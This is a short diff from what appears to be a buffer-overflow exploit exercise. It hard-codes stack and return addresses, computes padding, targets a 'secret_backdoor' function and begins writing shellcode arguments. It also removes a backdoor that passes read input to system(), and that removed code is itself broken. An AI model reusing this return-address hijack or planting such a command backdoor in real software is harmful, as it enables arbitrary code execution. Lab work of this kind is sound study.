@@ -9,14 +9,6 @@ uint64_t bufferAddr = 0x7fffffffe3d0;
 uint64_t padding = rip - bufferAddr;
 uint64_t addrJump = 0x55555555488c; // secret_backdoor function
 
-void secret_backdoor()
-{
-	char *buffer;
-
-	fgets(buffer, 0x80, 0);
-	system(buffer);
-}
-
 void writeShellCode1()
 {
 	std::ofstream file("args/arg1");
